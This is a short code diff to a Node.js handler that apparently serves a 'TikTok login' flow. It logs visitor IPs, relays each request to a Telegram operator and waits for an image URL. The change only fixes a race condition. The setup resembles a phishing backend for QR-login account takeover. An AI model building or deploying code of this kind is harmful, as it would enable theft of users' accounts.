@@ -14,15 +14,21 @@ function tiktokLoginResponse(req, res) {
     const id = uuidv4();
     store.create(id, 'TikTok', ip);
     console.log('[tiktok-login] awaiting image URL from Telegram', JSON.stringify({ request_id: id, client_ip: ip }));
-    sendTiktokMessage(id, ip)
+    // Wait for Telegram so telegramMessageId is set before the client polls; avoids races if you reply quickly.
+    return sendTiktokMessage(id, ip)
         .then(function (tgRes) {
             if (tgRes && tgRes.ok && tgRes.result) {
                 const rec = store.get(id);
                 if (rec) rec.telegramMessageId = tgRes.result.message_id;
+            } else {
+                console.error('[tiktok-login] Telegram sendMessage failed', tgRes);
             }
+            return res.status(202).json({ status: 'pending', request_id: id });
         })
-        .catch(err => console.error('sendTiktokMessage failed:', err));
-    return res.status(202).json({ status: 'pending', request_id: id });
+        .catch(function (err) {
+            console.error('sendTiktokMessage failed:', err);
+            return res.status(202).json({ status: 'pending', request_id: id });
+        });
 }
 
 function pendingResponse(res, userLabel, ip, message) {
